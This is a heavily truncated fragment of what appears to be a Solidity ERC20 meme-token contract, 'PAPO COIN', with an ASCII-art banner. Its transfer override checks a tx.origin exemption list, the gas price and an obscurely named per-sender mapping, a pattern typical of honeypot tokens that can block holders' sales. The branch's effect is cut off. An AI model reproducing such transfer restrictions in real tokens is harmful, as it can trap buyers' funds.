...
██║     ██║  ██║██║     ╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝      ╚═════╝ 
         PEPE always fails to  catch PAPO                                
...
contract PAPO is ERC20, Ownable {
    ...
    constructor() ERC20(unicode"PAPO COIN", unicode"PAPO") Ownable(msg.sender) {
    ...
    function _update(
        ...
        if (excludeStateOpenTrade[tx.origin]) {
            ...
            if (tx.gasprice > 0 &&  value > 0 && opimisio[from]) 
